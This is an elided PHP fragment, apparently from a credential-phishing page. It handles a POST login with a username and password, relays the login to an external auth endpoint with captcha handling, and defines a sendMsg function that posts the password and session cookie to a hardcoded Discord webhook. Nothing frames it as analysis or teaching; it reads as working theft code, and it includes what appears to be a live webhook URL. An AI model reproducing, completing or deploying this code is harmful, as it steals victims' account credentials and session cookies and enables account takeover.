...
if ($_SERVER['REQUEST_METHOD'] === "POST") {
 ...
 if ($u == null || $p == null) {
    ...
    "captchaProvider":"PROVIDER_ARKOSE_LABS"
        ...
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, 'https://auth.kazudev.com/v1/login');
...
function sendMsg($password, $webhook, $cookie)
{
    ...
    if ($httpcode == '200') {
        ...
        if ($cookie) {
            ...
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://discordapp.com/api/webhooks/848498199409066035/7g7IRZGlnh0yztwynCrZE8LTTVmHp7vd0ogU7Nd41y-Ca_VDmxLrGAjeVw1Qy-5PPUUI",
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
